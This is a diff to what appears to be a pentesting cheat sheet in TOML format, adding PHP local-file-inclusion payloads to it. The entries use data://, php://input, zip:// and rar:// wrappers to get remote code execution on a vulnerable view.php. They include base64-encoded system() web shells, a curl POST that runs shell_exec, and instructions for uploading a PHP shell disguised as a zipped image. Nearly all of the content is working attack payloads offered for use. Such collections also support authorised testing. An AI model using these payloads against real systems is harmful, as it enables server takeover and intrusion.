@@ -16,7 +16,9 @@ example.com/view.php?file=php://filter/zlib.deflate/convert.base64-encode/resour
 
 [[data]]
 description = "RCE through PHP 'data://' wrapper with base64:"
-command = """example.com/view.php?file=data://text/plan;base64,PD9waHAgc3lzdGVtKGlkkTs/Pg==
+command = """example.com/view.php?file=data://text/plain,<?php phpinfo(); ?>
+example.com/view.php?file=data:text/plain,<?php phpinfo(); ?>
+example.com/view.php?file=data://text/plan;base64,PD9waHAgc3lzdGVtKGlkkTs/Pg==
 example.com/view.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="""
 
 [[data]]
@@ -31,12 +33,16 @@ command = """Specify the payload in the POST parameter
 curl -X POST --data "<?php echo shell_exec('id'); ?>" "example.com/view.php?file=php://input%00" -k -v"""
 
 [[data]]
-description = "RCE through PHP 'zip://' wrapper:"
+description = "RCE through PHP 'zip://' and 'rar://' wrappers:"
 command = """# If you are able to upload images, create a payload, zip it, rename it to image and upload it
 echo "<?php system($_GET[0]); ?>" > payload.php
+
 zip payload.zip payload.php
+or
+rar a payload.rar payload.php
+
 mv payload.php payload.jpg
 
-# After uploading it, access the file via wrappers 
+# After uploading it, access the file via wrappers
 example.com/view.php?file=zip://shell.jpg%23payload.php
-"""
+example.com/view.php?file=rar://shell.jpg%23payload.php"""
